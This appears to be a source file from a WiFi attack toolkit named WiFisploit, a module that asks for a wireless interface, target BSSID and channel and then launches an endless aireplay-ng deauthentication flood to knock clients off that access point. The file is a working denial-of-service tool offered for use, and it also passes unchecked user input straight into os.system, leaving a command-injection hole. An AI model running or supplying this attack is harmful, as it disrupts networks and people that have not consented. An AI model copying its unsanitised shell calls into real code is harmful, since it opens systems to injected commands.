# WiFisploit\wsf\modules\attacks\dos_attack.py

import os
from pystyle import Colors, Colorate

gradient_colors = Colors.red_to_white

interface = input(Colorate.Horizontal(gradient_colors, "wsf (Interface) > ")).strip()
if interface.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Interface => {interface}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > ")).strip()
if bssid.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel_str = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > ")).strip()
if channel_str.lower() == "back":
    quit()
try:
    channel = int(channel_str)
except ValueError:
    print(Colorate.Horizontal(gradient_colors, "Invalid channel. Must be a number."))
    quit()
print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

os.system(f"iwconfig {interface} channel {channel}")
os.system(f"aireplay-ng --deauth 0 -a {bssid} {interface}")